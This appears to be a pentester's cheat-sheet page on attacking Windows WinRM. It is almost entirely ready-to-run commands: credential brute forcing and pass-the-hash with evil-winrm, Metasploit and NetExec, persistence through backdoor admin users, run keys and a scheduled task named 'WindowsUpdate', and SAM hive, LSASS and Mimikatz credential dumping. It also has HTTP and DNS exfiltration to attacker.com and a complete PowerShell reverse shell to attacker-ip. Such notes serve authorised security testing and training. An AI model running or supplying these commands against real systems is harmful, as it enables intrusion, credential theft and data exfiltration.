---
id: Exploitation
aliases: []
tags:
  - Networking/Services/WinRM/Exploitation
---


<!-- Exploitation {{{-->
# Exploitation

___

<!-- Brute Force {{{-->
## Brute Force

Brute force WinRM credentials using various tools and techniques

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passowrds
>
> - [[SecLists#Passowrds|SecLists]]
<!-- }}} -->

[[Metasploit]] — WinRM Login Utility
(*[winrm_login](https://www.rapid7.com/db/modules/auxiliary/scanner/winrm/winrm_login/)*)

<!-- Warning {{{-->
> [!warning]
>
> Only works if the remote end allows Negotiate (*[[NTLM]]*) authentication
>
> To use this module without SSL, the `AllowUnencrypted` WinRM option
> must be set
>
> [[Kerberos]] is not currently supported
<!-- }}} -->

```sh
use auxiliary/scanner/winrm/winrm_login
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use auxiliary/scanner/winrm/winrm_login
> set RHOSTS $target
> set USER_FILE <users.txt>
> set PASS_FILE <passwords.txt>
> run
> ```
<!-- }}} -->

Bash Script

<!-- Example {{{-->
> [!example]-
>
> ```sh
> for user in $(cat <users.txt>); do
>   for pass in $(cat <passwords.txt>); do
>     echo "Trying $user:$pass"
>     evil-winrm -i $target -u "$user" -p "$pass" -e /tmp/test
>   done
> done
> ```
<!-- }}} -->

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

> [!warning] Deprecated

```sh
crackmapexec winrm $target -u <user_list> -p <password_list>
```

[[NetExec]]

```sh
netexec winrm $target -u <user_list> -p <password_list>
```
___
<!-- }}} -->

<!-- Pass-the-Hash {{{-->
## Pass-the-Hash

Exploit [[NTLM]] hash authentication for [[WinRM/General|WinRM]] access

Using [evil-winrm](https://github.com/Hackplayers/evil-winrm)
with NTLM hash

```sh
evil-winrm -i $target -u Administrator -H '<hash>'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> evil-winrm -i $target -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
> ```
<!-- }}} -->

[[Metasploit]] — WinRM Script Exec Remote Code Execution

```sh
use exploit/windows/winrm/winrm_script_exec
```

<!-- Info {{{-->
> [!info]-
>
> [winrm_script_exec](https://www.rapid7.com/db/modules/exploit/windows/winrm/winrm_script_exec/)
> uses valid credentials to login to the WinRM service
> and execute a payload
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/windows/winrm/winrm_script_exec
> set RHOSTS $target
> set USERNAME administrator
> set HASH 32ed87bdb5fdc5e9cba88547376818d4
> run
> ```
<!-- }}} -->

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

> [!warning] Deprecated

```sh
crackmapexec winrm $target -u <user> -H '<hash>'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> crackmapexec winrm $target -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
> ```
<!-- }}} -->

[[NetExec]]

```sh
netexec winrm $target -u <user> -H '<hash>'
```
___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Configuration Check {{{-->
## Configuration Check

Check WinRM configuration and service status

[Get-Service](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-service?view=powershell-7.5) —
Check if WinRM is running

```sh
Get-Service WinRM
```

Check WinRM configuration

```sh
winrm get winrm/config
```

Check listeners

```sh
winrm enumerate winrm/config/listener
```

[Test-WSMan](https://learn.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.5) —
Test if WinRM is accessible remotely

```sh
Test-WSMan -ComputerName $target
```
___
<!-- }}} -->

<!-- Lateral Movement {{{-->
## Lateral Movement

Expand access to other systems using WinRM

Execute on multiple machines

> [!example]-
>
> ```sh
> $computers = Get-ADComputer -Filter * | Select -ExpandProperty Name
> ```
>
> ```sh
> Invoke-Command -ComputerName $computers -ScriptBlock { hostname }
> ```


Pass credentials to other systems

> [!example]-
>
> ```sh
> $cred = Get-Credential
> ```
>
> ```sh
> Invoke-Command -ComputerName server2 -Credential $cred -ScriptBlock {
>   # <commands>
> }
> ```

Copy files and execute

> [!example]-
>
> ```sh
> Copy-Item -Path payload.exe -Destination \\$target\C$\Windows\Temp\
> ```
> ```sh
> Invoke-Command -ComputerName $target -ScriptBlock {
>   C:\Windows\Temp\payload.exe
> }
> ```

PSRemoting through multiple hops

> [!example]-
>
> 1. Enable CredSSP on source
>
> ```sh
> Enable-WSManCredSSP -Role Client -DelegateComputer $target
> ```
>
>
> 2. Execute with CredSSP
>
> ```sh
> $cred = Get-Credential
> ```
>
> ```sh
> Invoke-Command -ComputerName $target -Credential $cred -Authentication CredSSP -ScriptBlock {
>   Invoke-Command -ComputerName $target2 -ScriptBlock { hostname }
> }
> ```

___

<!-- }}} -->

<!-- Privilege Escalation {{{-->
## Privilege Escalation

[[Windows/Privesc/Privesc|Escalate privileges]] on compromised WinRM systems

Check [[Privesc/Privileges|Privileges]]

```sh
whoami /priv
```

Check for unquoted service paths

> [!info]-
>
> Windows can interpret unquoted service path components loosely,
> letting local attacker place a malicious executable
> in a higher-priority folder to run with service's privileges
> (*often `SYSTEM`*)


> [!example]-
>
> ```sh
> wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
> ```

Check `AlwaysInstallElevated` policy

<!-- Info {{{-->
> [!info]-
>
> Check whether the `AlwaysInstallElevated` policy is enabled
> for machine (`HKLM`) and user (`HKCU`) —
> if both are set to `1`, non-elevated MSI installs
> can run with `SYSTEM` privileges
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
> ```
> ```sh
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
> ```
<!-- }}} -->

Check for stored credentials

<!-- Example {{{ -->
> [!example]-
>
> ```sh
> cmdkey /list
> ```
> ```sh
> dir C:\Users\username\AppData\Local\Microsoft\Credentials\
> ```
> ```sh
> dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
> ```
<!-- }}} -->

Enumeration with
[PowerUp](https://powersploit.readthedocs.io/en/latest/Privesc/)

<!-- Example {{{ -->
> [!example]-
>
> Download and Run [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
>
> ```sh
> IEX(New-Object Net.WebClient).DownloadString('http://<attacker.com>/PowerUp.ps1')
> ```
> ```sh
> Invoke-AllChecks
> ```
<!-- }}} -->

___

<!-- }}} -->

<!-- Persistence {{{-->
## Persistence

Create persistent backdoor access to compromised WinRM systems

**Create Backdoor User**

1. Create new user

```sh
net user <user> <password> /add
```

2. Add user to `administrators` group

```sh
net localgroup administrators <user> /add
```

3. Add user to `Remote Desktop Users` group

```sh
net localgroup "Remote Desktop Users" <user> /add
```

**Registry Run Key**

Automatically launch `backdoor.exe` when that user logs in

```sh
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"
```

**Scheduled Task**

Run `backdoor.exe` at logon with `SYSTEM` privileges

```sh
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM
```

WMI event subscription

> [!info]-
>
> Create a WMI `__EventFilter` named `Backdoor` in `root\subscription`
> that fires every 60 seconds on changes to
> `Win32_PerfFormattedData_PerfOS_System`

<!-- Example {{{-->
> [!example]-
>
> ```sh
> $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
>   Name = "Backdoor"
>   EventNameSpace = "root\cimv2"
>   QueryLanguage = "WQL"
>   Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
> }
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Credential Harvesting {{{-->
## Credential Harvesting

Download files to the attacker machine

<!-- Example {{{-->
> [!example]-
>
> ```sh
> download C:\Windows\Temp\sam
> ```
> ```sh
> download C:\Windows\Temp\system
> ```
> ```sh
> download C:\Windows\Temp\security
> ```
<!-- }}} -->

Dump [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager)
registry hives to perform [[#Pass-the-Hash]]

<!-- Example {{{-->
> [!example]-
>
> `HKLM\SAM` hive contains local account password hashes
>
> ```sh
> reg save HKLM\SAM C:\Windows\Temp\sam
> ```
>
> `HKLM\SYSTEM` contains boot keys used to decrypt password hashes
>
> ```sh
> reg save HKLM\SYSTEM C:\Windows\Temp\system
> ```
>
> `HKLM\SECURITY` contains [LSA](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)
> secrets which can contain service-accounts secrets, cached/secret credentials
> and keys an attacker can extract offline
>
> ```sh
> reg save HKLM\SECURITY C:\Windows\Temp\security
> ```
<!-- }}} -->

[procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) —
Dump [LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)
(*requires admin*)

```sh
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

[[Mimikatz]] — Extract credentials

<!-- Example {{{-->
> [!example]-
>
> 1. Run Mimikatz
>
> ```sh
> IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
> Invoke-Mimikatz -DumpCreds
> ```
>
> 2. Extract credentials from memory
>
> ```sh
> privilege::debug
> ```
> ```sh
> sekurlsa::logonpasswords
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- File Operations {{{-->
## File Operations

Perform file operations on compromised WinRM systems

[evil-winrm](https://github.com/Hackplayers/evil-winrm) —
[[Pentest/General/File Transfer/Windows/Upload|Upload]] file

```sh
upload </local/path/file.exe> <C:\Windows\Temp\file.exe>
```

[evil-winrm](https://github.com/Hackplayers/evil-winrm) —
[[Pentest/General/File Transfer/Windows/Download|Download]] file

```sh
download C:\Windows\System32\config\SAM </tmp/sam>
```

[Copy-Item](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/copy-item?view=powershell-7.5) —
Copy files

```sh
Copy-Item -Path <\\source\share\file.txt> -Destination <C:\Temp\>
```

[Get-ChildItem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7.5) —
Search for interesting files

```sh
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.doc,*.xls -Recurse -ErrorAction SilentlyContinue
```

[Select-String](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7.5) —
Find passwords in files

```sh
Select-String -Path C:\*.txt,C:\*.config -Pattern "password"
```

___

<!-- }}} -->

<!-- Data Exfiltration {{{-->
## Data Exfiltration

Extract and exfiltrate sensitive data from compromised systems

Compress and exfiltrate data

> [!example]-
>
> 1. Compress data
>
> ```sh
> Compress-Archive -Path C:\Sensitive\ -DestinationPath C:\Temp\data.zip
> ```
>
> 2. Download via [evil-winrm](https://github.com/Hackplayers/evil-winrm)
>
> ```sh
> download C:\Temp\data.zip
> ```

Exfiltrate via HTTP

> [!example]-
>
> ```sh
> $data = Get-Content C:\Sensitive\data.txt
> ```
> ```sh
> Invoke-WebRequest -Uri "http://attacker.com/collect" -Method POST -Body $data
> ```

Base64 encode and exfiltrate

> [!example]-
>
> ```sh
> $bytes = [System.IO.File]::ReadAllBytes("C:\Sensitive\file.exe")
> ```
> ```sh
> $base64 = [System.Convert]::ToBase64String($bytes)
> ```
> ```sh
> Invoke-WebRequest -Uri "http://attacker.com/collect" -Method POST -Body $base64
> ```

DNS exfiltration

> [!example]-
>
> ```sh
> $data = Get-Content C:\data.txt
> ```
> ```sh
> $data | ForEach-Object {
>   nslookup "$_. attacker.com"
> }
> ```

___

<!-- }}} -->

<!-- Reverse Shell {{{-->
## Reverse Shell

Establish [[Pentest/General/Shells/Reverse Shell/General]] connections for persistent access

PowerShell reverse shell

<!-- Example {{{-->
> [!example]-
>
> ```sh
> $client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444)
> $stream = $client.GetStream()
> [byte[]]$bytes = 0..65535|%{0}
> while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
>   $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
>   $sendback = (iex $data 2>&1 | Out-String )
>   $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
>   $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
>   $stream.Write($sendbyte,0,$sendbyte.Length)
>   $stream.Flush()
> }
> ```
>
> One-liner PowerShell reverse shell
>
> ```sh
> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Domain Reconnaissance {{{-->
## Domain Reconnaissance

Perform [[Active Directory]] reconnaissance using WinRM access

Domain information

> [!example]-
>
> ```sh
> Get-ADDomain
> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
> ```

Domain controllers

> [!example]-
>
> ```sh
> Get-ADDomainController -Filter *
> ```
> ```sh
> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
> ```

Domain users

> [!example]-
>
> ```sh
> Get-ADUser -Filter * -Properties *
> ```
> ```sh
> net user /domain
> ```

Domain computers

> [!example]-
>
> ```sh
> Get-ADComputer -Filter *
> ```
> ```sh
> net view /domain
> ```

Domain groups

> [!example]-
>
> ```sh
> Get-ADGroup -Filter *
> ```
> ```sh
> net group /domain
> ```

Group members

> [!example]-
>
> ```sh
> Get-ADGroupMember "Domain Admins"
> ```
> ```sh
> net group "Domain Admins" /domain
> ```

GPOs

> [!example]-
>
> ```sh
> Get-GPO -All
> ```

___

<!-- }}} -->

<!-- }}} -->
